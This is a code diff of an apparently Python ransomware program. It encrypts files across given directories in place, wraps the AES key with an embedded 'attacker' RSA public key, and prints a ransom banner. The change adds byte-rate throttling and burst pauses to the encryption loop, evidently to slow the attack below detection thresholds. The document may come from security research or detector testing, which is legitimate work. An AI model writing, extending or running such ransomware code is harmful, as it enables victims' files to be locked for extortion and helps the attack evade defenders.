@@ -209,6 +209,7 @@ def select_decryption_algorithm(filename, key):
 
 def encrypt_files(key, start_dirs):
     file_counter = 0
+    file_sizes = 0
     burst_start = time.time()
 
     # TODO: remove development variables
@@ -220,13 +221,15 @@ def encrypt_files(key, start_dirs):
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
             if not file.endswith(EXTENSION):
-                # TODO: implement rate limitation
                 config = get_config_from_file()
                 duration = int(config["BURST"]["duration"][1:])  # format examples "s5" or "f30"
                 limit_files = config["BURST"]["duration"].startswith("f")
+                rate = float(config["BURST"]["rate"])
+
+                file_sizes += os.path.getsize(file)  # file size in bytes (= nr of characters)
 
                 # TODO: remove debug prints
-                print(os.path.getsize(file), file, file_counter)  # file size in bytes (= nr of characters)
+                print(os.path.getsize(file), "/", file_sizes, file, file_counter)
 
                 crypt, flag, extra = select_encryption_algorithm(key)
                 modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
@@ -246,6 +249,13 @@ def encrypt_files(key, start_dirs):
 
                 file_counter += 1
 
+                burst_running = time.time() - burst_start
+                if rate > 0 and rate * burst_running < file_sizes:  # burst rate is limited
+                    # if r * b < f then r * (b + n) = f, thus n = f/r - b
+                    even_out = (file_sizes / rate) - burst_running
+                    print("sleeping for", even_out, "to limit rate")
+                    time.sleep(even_out)
+
                 if duration > 0:  # burst duration is limited
                     reset_burst = False
                     if limit_files:
@@ -262,6 +272,7 @@ def encrypt_files(key, start_dirs):
                             time.sleep(int(config["BURST"]["pause"]))
                     if reset_burst:
                         file_counter = 0
+                        file_sizes = 0
                         burst_start = time.time()
 
 
@@ -270,7 +281,6 @@ def decrypt_files(key, start_dirs):
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
             if file.endswith(EXTENSION):
-                # do not use double encrypt for decrypt (might work with this setup, but not guaranteed)
                 crypt, flag = select_decryption_algorithm(file, key)
                 modify_file_inplace(file, crypt.decrypt, flag[-1] + "1")
 
@@ -289,10 +299,8 @@ def run(absolute_paths, encrypt):
     # Encrypt AES key with attacker's embedded RSA public key
     server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
     encryptor = PKCS1_OAEP.new(server_key)
-    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
-    encrypted_key_b64 = b64encode(encrypted_key).decode("ascii")
-
-    print("Encrypted key " + encrypted_key_b64 + "\n")
+    encrypted_key_b64 = b64encode(encryptor.encrypt(HARDCODED_KEY)).decode("ascii")
+    print("Encrypted key", encrypted_key_b64, "\n")
 
     if encrypt:
         print("[COMPANY_NAME]\n\n"
@@ -343,7 +351,6 @@ def main():
     args = parse_args()
     encrypt = args.encrypt
     # decrypt = args.decrypt
-
     absolute_paths = str(args.path)
 
     run(absolute_paths, encrypt)
